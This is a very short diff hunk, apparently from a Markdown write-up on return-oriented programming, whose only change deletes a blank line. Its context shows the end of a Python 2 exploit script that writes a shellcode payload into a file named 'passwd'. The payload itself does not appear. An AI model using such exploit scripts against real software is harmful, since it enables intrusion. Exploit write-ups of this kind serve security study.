@@ -110,6 +110,5 @@ fw=open('passwd','w')
 fw.write(shellcode)
 fw.close()
 print 'ok!'
-
 ~~~
 ![ROP](ROP.png)
